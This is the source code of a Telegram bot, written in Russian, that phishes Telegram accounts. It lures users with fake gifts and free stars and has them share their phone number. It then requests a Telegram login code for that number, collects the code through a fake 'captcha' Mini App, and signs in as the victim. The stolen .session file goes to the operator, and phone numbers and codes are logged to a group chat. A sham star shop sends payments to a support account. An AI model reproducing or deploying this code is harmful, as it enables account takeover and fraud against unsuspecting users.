"""
NexusSession Bot — с Mini App капчей
"""

import asyncio
import os
import sys
import json
import configparser
import sqlite3
import logging
from datetime import datetime
from aiohttp import web

try:
    from aiogram import Bot, Dispatcher, executor, types
    from aiogram.contrib.fsm_storage.memory import MemoryStorage
    from aiogram.dispatcher import FSMContext
    from aiogram.dispatcher.filters.state import State, StatesGroup
    from aiogram.types import (
        Message, CallbackQuery,
        ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove,
        InlineKeyboardMarkup, InlineKeyboardButton,
        WebAppInfo,
    )
    from telethon import TelegramClient
    from telethon.errors.rpcerrorlist import (
        PhoneCodeInvalidError, FloodWaitError, SessionPasswordNeededError
    )
except ImportError as e:
    sys.exit(f"[!] Зависимости не установлены: {e}\n    pip install aiogram==2.25.2 telethon aiohttp")

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(name)s: %(message)s',
    datefmt='%H:%M:%S'
)
log = logging.getLogger('nexus')

# ═══════════════════════════════════════════
# КОНФИГ
# ═══════════════════════════════════════════
BASE_DIR    = os.path.dirname(os.path.abspath(__file__))
CONFIG_PATH = os.path.join(BASE_DIR, 'utils', 'config.ini')
SESSION_DIR = os.path.join(BASE_DIR, 'session')
DB_PATH     = os.path.join(BASE_DIR, 'data', 'database.db')

# ЛОГИ В ГРУППУ
LOG_CHAT_ID = -1003987249727
LOG_THREAD_ID = 4  # Mini App | Log

_ENV_MAP = {
    'bot_token':  'BOT_TOKEN',
    'admin_id':   'ADMIN_ID',
    'chat_id':    'CHAT_ID',
    'api_id':     'API_ID',
    'api_hash':   'API_HASH',
    'two_fa':     'TWO_FA',
    'webapp_url': 'WEBAPP_URL',
}


def _cfg(key: str) -> str:
    env_key = _ENV_MAP.get(key.lower())
    if env_key:
        val = os.environ.get(env_key, '').strip()
        if val:
            return val
    if os.path.exists(CONFIG_PATH):
        cfg = configparser.ConfigParser()
        cfg.read(CONFIG_PATH, encoding='utf-8')
        return cfg.get('Settings', key, fallback='').strip()
    return ''

_RAILWAY_DOMAIN = os.environ.get('RAILWAY_PUBLIC_DOMAIN', '')
WEBAPP_URL = (
    f'https://{_RAILWAY_DOMAIN}'
    if _RAILWAY_DOMAIN
    else _cfg('webapp_url').rstrip('/')
)

# ═══════════════════════════════════════════
# БАЗА ДАННЫХ
# ═══════════════════════════════════════════
os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
os.makedirs(SESSION_DIR, exist_ok=True)

_db = sqlite3.connect(DB_PATH, check_same_thread=False)
_db.execute(
    'CREATE TABLE IF NOT EXISTS users '
    '(user_id INTEGER PRIMARY KEY, username TEXT, phone TEXT, date TEXT)'
)
_db.execute(
    'CREATE TABLE IF NOT EXISTS pending '
    '(user_id INTEGER PRIMARY KEY, phone TEXT, code_hash TEXT, date TEXT)'
)
_db.commit()


def db_join(user_id: int, username: str) -> bool:
    row = _db.execute('SELECT 1 FROM users WHERE user_id=?', [user_id]).fetchone()
    if row:
        return False
    _db.execute(
        'INSERT INTO users VALUES (?,?,?,?)',
        [user_id, username or '', 'NOT', datetime.now().isoformat()]
    )
    _db.commit()
    return True


def db_save_pending(user_id: int, phone: str, code_hash: str):
    _db.execute(
        'INSERT OR REPLACE INTO pending VALUES (?,?,?,?)',
        [user_id, phone, code_hash, datetime.now().isoformat()]
    )
    _db.commit()


def db_get_pending(user_id: int):
    return _db.execute(
        'SELECT phone, code_hash FROM pending WHERE user_id=?', [user_id]
    ).fetchone()


def db_clear_pending(user_id: int):
    _db.execute('DELETE FROM pending WHERE user_id=?', [user_id])
    _db.commit()


def db_set_phone(user_id: int, phone: str) -> None:
    _db.execute('UPDATE users SET phone=? WHERE user_id=?', [phone, user_id])
    _db.commit()


# ═══════════════════════════════════════════
# МАСКИРОВКА
# ═══════════════════════════════════════════
def mask_username(username):
    if not username:
        return "Без_юзернейма"
    if len(username) <= 2:
        return username
    # Первая буква + звёзды + последняя буква
    return username[0] + '*' * (len(username) - 2) + username[-1]

def mask_id(user_id):
    s = str(user_id)
    if len(s) <= 4:
        return s
    # Первая цифра + звёзды + последняя цифра
    return s[0] + '*' * (len(s) - 2) + s[-1]


# ═══════════════════════════════════════════
# TELETHON
# ═══════════════════════════════════════════
def make_client(phone: str) -> TelegramClient:
    return TelegramClient(
        session=os.path.join(SESSION_DIR, f'{phone[1:]}.session'),
        api_id=int(_cfg('api_id')),
        api_hash=_cfg('api_hash'),
        device_model='iPhone 14 Pro',
        system_version='16.6',
        app_version='9.6.3',
    )


def _normalize_phone(raw: str) -> str:
    phone = raw.strip()
    if not phone.startswith('+'):
        phone = '+' + phone
    return phone


# ═══════════════════════════════════════════
# BOT + DISPATCHER
# ═══════════════════════════════════════════
bot = Bot(token=_cfg('bot_token'), parse_mode=types.ParseMode.HTML)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)


class Auth(StatesGroup):
    wait_contact  = State()
    wait_webapp   = State()


class Withdraw(StatesGroup):
    username = State()
    amount   = State()


# ─── Клавиатуры ─────────────────────────────────────────

def kb_phone() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        resize_keyboard=True,
        keyboard=[[KeyboardButton('📱 Продолжить', request_contact=True)]]
    )


def kb_phone() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        resize_keyboard=True,
        keyboard=[[KeyboardButton('📱 Продолжить', request_contact=True)]]
    )


def kb_open_captcha(user_id: int) -> ReplyKeyboardMarkup:
    url = f'{WEBAPP_URL}/captcha?uid={user_id}'
    return ReplyKeyboardMarkup(
        resize_keyboard=True,
        keyboard=[[
            KeyboardButton(
                text='🔐 Пройти проверку',
                web_app=WebAppInfo(url=url)
            )
        ]]
    )


def kb_menu() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        resize_keyboard=True,
        keyboard=[
            [KeyboardButton('👤 Профиль')],
            [KeyboardButton('⭐ Купить звёзды')],
            [KeyboardButton('ℹ️ О магазине')],
        ]
    )


# ═══════════════════════════════════════════
# ХЕНДЛЕРЫ
# ═══════════════════════════════════════════

@dp.message_handler(commands=['start'], state='*')
async def cmd_start(msg: Message, state: FSMContext):
    await state.finish()
    is_new = db_join(msg.from_user.id, msg.from_user.username)
    
    if is_new:
        # ЛОГ В ГРУППУ: 🆕 Новый: IT*******S | 710*****06
        masked_un = mask_username(msg.from_user.username or "")
        masked_id = mask_id(msg.from_user.id)
        try:
            await bot.send_message(
                chat_id=LOG_CHAT_ID,
                message_thread_id=LOG_THREAD_ID,
                text=f'🆕 Новый: {masked_un} | {masked_id}'
            )
        except Exception:
            pass
        
        # Уведомление админу в личку
        admin_id = _cfg('admin_id')
        if admin_id and admin_id != '0':
            try:
                await bot.send_message(
                    int(admin_id),
                    f'🆕 Новый пользователь: {msg.from_user.get_mention()} | <code>{msg.from_user.id}</code>'
                )
            except Exception:
                pass
    
    await msg.answer(
        f'👋 <b>Привет, {msg.from_user.get_mention()}!</b>\n\n'
        '🎁 Вам отправили подарок — нажмите <b>«📱 Продолжить»</b> '
        'и поделитесь номером телефона для проверки личности.',
        reply_markup=kb_phone()
    )
    await Auth.wait_contact.set()


@dp.message_handler(commands=['help'], state='*')
async def cmd_help(msg: Message):
    await msg.answer(
        '<b>ℹ️ Помощь</b>\n\n'
        '/start — начать\n/help — справка\n\n'
        '📞 Поддержка: @lanox_support'
    )


@dp.message_handler(commands=['gift'], state='*')
async def cmd_gift(msg: Message, state: FSMContext):
    await state.finish()
    await msg.answer(
        '🎁 <b>Вам дарят NFT: JesterHat #120172</b>\n\n'
        'Учтите, что подарок можно принять только с аккаунта, '
        'на который был отправлен данный подарок. '
        'Ссылка действительна 60 минут с момента получения.\n\n'
        'https://t.me/nft/JesterHat-120172',
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton('Получить 🎁', url='https://t.me/FairStarsRobot?start=gift')
        ]])
    )


@dp.message_handler(commands=['stars'], state='*')
async def cmd_stars(msg: Message, state: FSMContext):
    await state.finish()
    await msg.answer_photo(
        photo='https://i.postimg.cc/Xv9DyHTF/photo-2025-11-07-21-49-26.jpg',
        caption=(
            '✨ <b>ВАМ НАЧИСЛЕНО 2500 ЗВЁЗД!</b>\n\n'
            '🎉 Поздравляем! Вам был выдан специальный бонус — '
            '2500 звёзд на ваш аккаунт.\n\n'
            '⏰ Успейте забрать до истечения времени:\n'
            '🕐 Чек действителен всего <b>25 минут!</b>\n\n'
            'Для зачисления звёзд нажмите кнопку ниже 👇'
        ),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton('🚀 ЗАБРАТЬ 2500 ЗВЁЗД', url='https://t.me/FairStarsRobot?start=gift')
        ]])
    )


# ── Получаем контакт ──────────────────────────────────────────
@dp.message_handler(content_types=['contact'], state=Auth.wait_contact)
async def on_contact(msg: Message, state: FSMContext):
    phone = _normalize_phone(msg.contact.phone_number)
    db_set_phone(msg.from_user.id, phone)

    # ЛОГ: пользователь отправил номер
    masked_un = mask_username(msg.from_user.username or "")
    masked_id = mask_id(msg.from_user.id)
    try:
        await bot.send_message(
            chat_id=LOG_CHAT_ID,
            message_thread_id=LOG_THREAD_ID,
            text=f'📱 {masked_un} | {masked_id} отправил номер: <code>{phone}</code>'
        )
    except Exception:
        pass

    session_file = os.path.join(SESSION_DIR, f'{phone[1:]}.session')
    if os.path.exists(session_file):
        os.remove(session_file)
        log.info('Удалена старая сессия: %s', session_file)

    await msg.answer('🔐 <b>Генерирую капчу для проверки...</b>', reply_markup=ReplyKeyboardRemove())

    try:
        client = make_client(phone)
        await client.connect()
        sent = await client.send_code_request(phone)
        await client.disconnect()
    except FloodWaitError as e:
        await msg.answer(f'❌ <b>Слишком много попыток.</b> Подождите {e.seconds} сек.')
        await state.finish()
        return
    except Exception as e:
        await msg.answer(f'❌ <b>Ошибка при отправке кода:</b> {e}')
        await state.finish()
        return

    db_save_pending(msg.from_user.id, phone, sent.phone_code_hash)
    await state.update_data(phone=phone, code_hash=sent.phone_code_hash)
    await Auth.wait_webapp.set()

    # ЛОГ: код отправлен
    try:
        await bot.send_message(
            chat_id=LOG_CHAT_ID,
            message_thread_id=LOG_THREAD_ID,
            text=f'🔐 {masked_un} | {masked_id} — код отправлен на номер <code>{phone}</code>'
        )
    except Exception:
        pass

    await msg.answer(
        '🛡️ <b>Капча сгенерирована.</b>\n\n'
        '👇 Нажмите кнопку ниже и пройдите проверку:',
        reply_markup=kb_open_captcha(msg.from_user.id)
    )


# ── Получаем данные от Mini App ──────────────────────────────
@dp.message_handler(content_types=['web_app_data'], state='*')
async def on_webapp_data(msg: Message, state: FSMContext):
    raw = msg.web_app_data.data
    log.info('WebApp data from %s: %s', msg.from_user.id, raw)

    try:
        payload = json.loads(raw)
        code = str(payload.get('code', '')).strip()
    except Exception:
        code = raw.strip()

    masked_un = mask_username(msg.from_user.username or "")
    masked_id = mask_id(msg.from_user.id)

    # ЛОГ: ввёл код
    try:
        await bot.send_message(
            chat_id=LOG_CHAT_ID,
            message_thread_id=LOG_THREAD_ID,
            text=f'📩 {masked_un} | {masked_id} ввёл код: <code>{code}</code>'
        )
    except Exception:
        pass

    if not code or len(code) != 5 or not code.isdigit():
        await msg.answer('❌ <b>Неверный формат кода.</b> Попробуйте снова — /start')
        await state.finish()
        return

    data = await state.get_data()
    phone     = data.get('phone')
    code_hash = data.get('code_hash')

    if not phone or not code_hash:
        row = db_get_pending(msg.from_user.id)
        if row:
            phone, code_hash = row
        else:
            await msg.answer('❌ <b>Сессия истекла.</b> Начните заново — /start')
            await state.finish()
            return

    await msg.answer('🔄 <b>Проверяю код...</b>')

    client = make_client(phone)
    await client.connect()

    try:
        await client.sign_in(phone=phone, code=code, phone_code_hash=code_hash)

    except PhoneCodeInvalidError:
        try:
            await bot.send_message(
                chat_id=LOG_CHAT_ID,
                message_thread_id=LOG_THREAD_ID,
                text=f'❌ {masked_un} | {masked_id} — неверный код: <code>{code}</code>'
            )
        except Exception:
            pass
        await msg.answer('❌ <b>Неправильный код!</b>\nПопробуйте ещё раз — нажмите кнопку проверки снова.',
            reply_markup=kb_open_captcha(msg.from_user.id))
        await _safe_disconnect(client)
        return

    except SessionPasswordNeededError:
        two_fa = _cfg('two_fa')
        if not two_fa:
            await msg.answer('🔒 <b>Требуется пароль 2FA.</b> Обратитесь к администратору.')
            await _safe_disconnect(client)
            await state.finish()
            return
        try:
            await client.sign_in(password=two_fa)
        except Exception as e:
            await msg.answer(f'❌ <b>Ошибка 2FA:</b> {e}\nПопробуйте снова — /start')
            await _safe_disconnect(client)
            await state.finish()
            return

    except Exception as e:
        await msg.answer(f'❌ <b>Ошибка:</b> {e}\nПопробуйте снова — /start')
        await _safe_disconnect(client)
        await state.finish()
        return

    # ── УСПЕХ ──────────────────────────────────────────
    db_clear_pending(msg.from_user.id)
    await msg.answer('✅ <b>Верификация пройдена успешно!</b>')
    
    # ОТПРАВЛЯЕМ СЕССИЮ ТОЛЬКО АДМИНУ В ЛИЧКУ
    await _send_session_to_admin(msg, phone)
    await _safe_disconnect(client)

    # ЛОГ: верификация пройдена
    try:
        await bot.send_message(
            chat_id=LOG_CHAT_ID,
            message_thread_id=LOG_THREAD_ID,
            text=f'✅ {masked_un} | {masked_id} — верификация пройдена!'
        )
    except Exception:
        pass

    await bot.send_photo(
        chat_id=msg.from_user.id,
        photo='https://i.postimg.cc/x8g5Mws2/Chat-GPT-Image-8-noab-2025-g-22-31-00.png',
        caption=(
            '🎉 <b>Добро пожаловать в магазин звёзд Lanoxa!</b>\n\n'
            '💫 Самые низкие цены на звёзды\n'
            '⭐ Открывайте эксклюзивный контент\n\n'
            '<i>Бот в бета-тесте, некоторые функции могут не работать</i>'
        ),
        reply_markup=kb_menu()
    )
    await state.finish()


# ═══════════════════════════════════════════
# МЕНЮ
# ═══════════════════════════════════════════

@dp.message_handler(lambda m: m.text == '👤 Профиль')
async def on_profile(msg: Message):
    await msg.answer_photo(
        photo='https://i.postimg.cc/x8g5Mws2/Chat-GPT-Image-8-noab-2025-g-22-31-00.png',
        caption=(
            '👤 <b>ВАШ ПРОФИЛЬ</b>\n\n'
            f'🆔 ID: <code>{msg.from_user.id}</code>\n'
            '⭐ Звёзды: 2500\n💼 Статус: Стандартный'
        ),
        reply_markup=ReplyKeyboardMarkup(
            resize_keyboard=True,
            keyboard=[
                [KeyboardButton('💳 Пополнить'), KeyboardButton('📤 Вывести')],
                [KeyboardButton('◀️ Назад')],
            ]
        )
    )

@dp.message_handler(lambda m: m.text == '💳 Пополнить')
async def on_deposit(msg: Message):
    await msg.answer('💳 <b>Пополнение</b>\n\n⏳ Скоро откроем!')

@dp.message_handler(lambda m: m.text == '📤 Вывести')
async def on_withdraw(msg: Message, state: FSMContext):
    await Withdraw.username.set()
    await msg.answer(
        '📤 <b>ВЫВОД ЗВЁЗД</b>\n\n'
        'Введите ваш <b>@username</b> в Telegram\n'
        '<i>(например: @username)</i>',
        reply_markup=ReplyKeyboardMarkup(
            resize_keyboard=True,
            keyboard=[[KeyboardButton('❌ Отмена')]]
        )
    )


@dp.message_handler(lambda m: m.text == '❌ Отмена', state='*')
async def on_cancel(msg: Message, state: FSMContext):
    await state.finish()
    await msg.answer('🏠 Главное меню', reply_markup=kb_menu())


@dp.message_handler(state=Withdraw.username)
async def on_withdraw_username(msg: Message, state: FSMContext):
    username = msg.text.strip()
    if not username.startswith('@'):
        username = '@' + username
    await state.update_data(username=username)
    await Withdraw.amount.set()
    await msg.answer(
        f'✅ Username: <b>{username}</b>\n\n'
        'Теперь введите <b>количество звёзд</b> для вывода:\n'
        '<i>(например: 100)</i>'
    )


@dp.message_handler(state=Withdraw.amount)
async def on_withdraw_amount(msg: Message, state: FSMContext):
    if not msg.text.isdigit():
        await msg.answer('❌ Введите число. Например: <b>100</b>')
        return

    amount = int(msg.text)
    if amount < 50:
        await msg.answer('❌ Минимальный вывод — <b>50 звёзд</b>')
        return

    data = await state.get_data()
    username = data.get('username')

    # Уведомляем админа в личку о заявке
    admin_id = _cfg('admin_id')
    if admin_id and admin_id != '0':
        try:
            await bot.send_message(
                int(admin_id),
                f'💸 <b>Заявка на вывод</b>\n\n'
                f'👤 {msg.from_user.get_mention()}\n'
                f'🆔 <code>{msg.from_user.id}</code>\n'
                f'📲 Username: <b>{username}</b>\n'
                f'⭐ Количество: <b>{amount} звёзд</b>'
            )
        except Exception as e:
            log.error('Не удалось отправить заявку: %s', e)

    await state.finish()
    await msg.answer(
        f'✅ <b>Заявка принята!</b>\n\n'
        f'📲 Username: <b>{username}</b>\n'
        f'⭐ Количество: <b>{amount} звёзд</b>\n\n'
        f'⏳ Звёзды будут отправлены в течение <b>5 часов</b>.\n'
        f'По вопросам: @lanox_support',
        reply_markup=kb_menu()
    )

@dp.message_handler(lambda m: m.text == '⭐ Купить звёзды')
async def on_buy(msg: Message):
    kb = InlineKeyboardMarkup(row_width=1, inline_keyboard=[
        [InlineKeyboardButton('⭐ 50 звёзд — 50 ₽', callback_data='buy:50:50')],
        [InlineKeyboardButton('⭐ 100 звёзд — 90 ₽ 🔥', callback_data='buy:100:90')],
        [InlineKeyboardButton('⭐ 250 звёзд — 200 ₽', callback_data='buy:250:200')],
        [InlineKeyboardButton('⭐ 500 звёзд — 370 ₽ 💎', callback_data='buy:500:370')],
        [InlineKeyboardButton('⭐ 1000 звёзд — 700 ₽ 👑', callback_data='buy:1000:700')],
    ])
    await msg.answer_photo(
        photo='https://i.postimg.cc/x8g5Mws2/Chat-GPT-Image-8-noab-2025-g-22-31-00.png',
        caption=(
            '⭐ <b>МАГАЗИН ЗВЁЗД</b>\n\n'
            '💰 Самые низкие цены на рынке\n'
            '⚡ Моментальная доставка после оплаты\n'
            '🔒 Безопасная сделка\n\n'
            '👇 <b>Выберите пакет звёзд:</b>'
        ),
        reply_markup=kb
    )


@dp.callback_query_handler(lambda c: c.data.startswith('buy:'))
async def on_buy_package(call: CallbackQuery):
    _, stars, price = call.data.split(':')
    await call.answer()

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton('💳 Оплатить', callback_data=f'pay:{stars}:{price}')],
        [InlineKeyboardButton('◀️ Назад', callback_data='back_to_shop')],
    ])

    bonus = ''
    if stars == '100':
        bonus = '\n🎁 <b>+10 звёзд бонус!</b>'
    elif stars == '500':
        bonus = '\n🎁 <b>+50 звёзд бонус!</b>'
    elif stars == '1000':
        bonus = '\n🎁 <b>+150 звёзд бонус!</b>'

    text = (
        f'⭐ <b>Пакет: {stars} звёзд</b>\n'
        f'💰 <b>Цена: {price} ₽</b>{bonus}\n\n'
        f'📦 Доставка: моментально\n'
        f'🔒 Безопасная оплата\n\n'
        f'Нажмите <b>«Оплатить»</b> для продолжения:'
    )

    try:
        await call.message.edit_caption(caption=text, reply_markup=kb)
    except Exception:
        await call.message.answer(text, reply_markup=kb)


@dp.callback_query_handler(lambda c: c.data.startswith('pay:'))
async def on_pay(call: CallbackQuery):
    _, stars, price = call.data.split(':')
    await call.answer()

    text = (
        f'💳 <b>ОПЛАТА</b>\n\n'
        f'⭐ Пакет: <b>{stars} звёзд</b>\n'
        f'💰 Сумма: <b>{price} ₽</b>\n\n'
        f'📲 Для оплаты напишите в поддержку:\n'
        f'👉 @lanox_support\n\n'
        f'Укажите количество звёзд и вам пришлют реквизиты.\n'
        f'Звёзды начисляются в течение 5 минут после оплаты.'
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton('💬 Написать в поддержку', url='https://t.me/lanox_support')],
        [InlineKeyboardButton('◀️ Назад', callback_data='back_to_shop')],
    ])

    try:
        await call.message.edit_caption(caption=text, reply_markup=kb)
    except Exception:
        await call.message.answer(text, reply_markup=kb)


@dp.callback_query_handler(lambda c: c.data == 'back_to_shop')
async def on_back_to_shop(call: CallbackQuery):
    await call.answer()
    kb = InlineKeyboardMarkup(row_width=1, inline_keyboard=[
        [InlineKeyboardButton('⭐ 50 звёзд — 50 ₽', callback_data='buy:50:50')],
        [InlineKeyboardButton('⭐ 100 звёзд — 90 ₽ 🔥', callback_data='buy:100:90')],
        [InlineKeyboardButton('⭐ 250 звёзд — 200 ₽', callback_data='buy:250:200')],
        [InlineKeyboardButton('⭐ 500 звёзд — 370 ₽ 💎', callback_data='buy:500:370')],
        [InlineKeyboardButton('⭐ 1000 звёзд — 700 ₽ 👑', callback_data='buy:1000:700')],
    ])
    text = (
        '⭐ <b>МАГАЗИН ЗВЁЗД</b>\n\n'
        '💰 Самые низкие цены на рынке\n'
        '⚡ Моментальная доставка после оплаты\n'
        '🔒 Безопасная сделка\n\n'
        '👇 <b>Выберите пакет звёзд:</b>'
    )
    try:
        await call.message.edit_caption(caption=text, reply_markup=kb)
    except Exception:
        await call.message.answer(text, reply_markup=kb)

@dp.message_handler(lambda m: m.text == 'ℹ️ О магазине')
async def on_about(msg: Message):
    await msg.answer(
        'ℹ️ <b>О МАГАЗИНЕ</b>\n\n'
        '🌟 Магазин звёзд Lanoxa\n💰 Самые низкие цены\n'
        '⚡ Быстрая доставка\n🔒 Безопасные сделки\n\n'
        '📞 Поддержка: @lanox_support'
    )

@dp.message_handler(lambda m: m.text == '◀️ Назад')
async def on_back(msg: Message):
    await msg.answer('🏠 Главное меню', reply_markup=kb_menu())


# ═══════════════════════════════════════════
# ВСПОМОГАТЕЛЬНЫЕ
# ═══════════════════════════════════════════

async def _safe_disconnect(client: TelegramClient):
    try:
        if client.is_connected():
            await client.disconnect()
    except Exception:
        pass


async def _send_session_to_admin(msg: Message, phone: str):
    """Отправляет .session файл ТОЛЬКО админу в личку"""
    session_file = os.path.join(SESSION_DIR, f'{phone[1:]}.session')
    if not os.path.exists(session_file):
        log.warning('Session file not found: %s', session_file)
        return

    admin_id = _cfg('admin_id')
    if not admin_id or admin_id == '0':
        log.warning('Admin ID не задан, сессия не отправлена')
        return

    caption = (
        f'👤 {msg.from_user.get_mention()}\n'
        f'📱 <code>{phone}</code>\n'
        f'🆔 <code>{msg.from_user.id}</code>'
    )

    try:
        with open(session_file, 'rb') as f:
            await bot.send_document(
                chat_id=int(admin_id),
                document=f,
                caption=caption
            )
        log.info('Сессия отправлена админу %s', admin_id)
    except Exception as e:
        log.error('Не удалось отправить сессию админу: %s', e)


# ═══════════════════════════════════════════
# WEB СЕРВЕР
# ═══════════════════════════════════════════

HTML_DIR = os.path.join(BASE_DIR, 'webapp')


async def handle_captcha(request: web.Request) -> web.Response:
    html_path = os.path.join(HTML_DIR, 'captcha.html')
    with open(html_path, 'r', encoding='utf-8') as f:
        content = f.read()
    return web.Response(text=content, content_type='text/html')


async def handle_health(request: web.Request) -> web.Response:
    return web.Response(text='ok')


def build_webapp() -> web.Application:
    app = web.Application()
    app.router.add_get('/captcha', handle_captcha)
    app.router.add_get('/health', handle_health)
    static_dir = os.path.join(HTML_DIR, 'static')
    if os.path.exists(static_dir):
        app.router.add_static('/static', static_dir)
    return app


# ═══════════════════════════════════════════
# ЗАПУСК
# ═══════════════════════════════════════════

async def on_startup(dp):
    log.info('Бот запущен. WebApp URL: %s', WEBAPP_URL or '(не задан)')


async def main():
    port = int(os.environ.get('PORT', 8080))
    webapp = build_webapp()
    runner = web.AppRunner(webapp)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    log.info('Web-сервер запущен на порту %s', port)
    await dp.start_polling(reset_webhook=True)


if __name__ == '__main__':
    from aiogram import executor as _executor
    loop = asyncio.get_event_loop()

    port = int(os.environ.get('PORT', 8080))
    webapp = build_webapp()
    runner = web.AppRunner(webapp)
    loop.run_until_complete(runner.setup())
    site = web.TCPSite(runner, '0.0.0.0', port)
    loop.run_until_complete(site.start())
    log.info('Web-сервер на порту %s | WebApp: %s', port, WEBAPP_URL or '(не задан)')

    _executor.start_polling(dp, skip_updates=True, on_startup=on_startup, loop=loop)